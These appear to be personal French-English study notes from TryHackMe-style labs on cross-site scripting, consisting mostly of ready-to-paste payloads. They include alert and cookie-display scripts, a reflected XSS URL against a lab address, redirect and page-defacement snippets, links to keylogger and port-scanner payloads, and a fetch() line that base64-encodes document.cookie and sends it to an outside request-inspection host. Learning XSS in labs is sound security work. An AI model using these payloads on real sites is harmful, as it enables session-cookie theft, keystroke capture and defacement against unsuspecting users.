XSS Cross Site Scripting

-> du code qu'on peut envoyer dans une web app et qui n'est pas filtrée
-> ce code "payload" peut être ecrit en Javascript, VBScript, Flash and CSS.


On peut retrouver des payloads sur XSS-Payloads.com

TRES UTILE :
<script>window.blabla</script>



Payloads :

Popup's :
<script>alert(“Hello World”)</script>
- Creates a Hello World message popup on a users browser.
sinon :  <iframe src="javascript:alert(`xss`)"> 

In Javascript window.location.hostname will show your hostname :
<script>alert(“window.location.hostname”)</script>

Cookies :
<script>alert(document.cookie);</script>


Writing HTML (document.write) 
- Override the website's HTML to add your own (essentially defacing the entire page).


XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) 
- You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.


Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) 
- A mini local port scanner (more information on this is covered in the TryHackMe XSS room).


Reflexcted XSS : Client-Side -> URL bar

http://10.10.186.74/#/track-result?id=<iframe src="javascript:alert(`xss`)">


<script>fetch('https://requestinspector.com/inspect/01gkc0pj9dad25nw3twvkf96hk?cookie=' + btoa(document.cookie));</script>


REDIRECTION DEPUIS L'URL :
	<script>window.location='URL'</script>
REDIRECTION DEPUIS UN BOUT DU SITE
	<script>window.location='/delete/3'</script>
	
window.location.hostname -> Adresse IP

DEFACING THE PAGE
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
où thm-title est l'id. Ici, c'était un span du genre
<span id='thm-title'>kenjf</span>
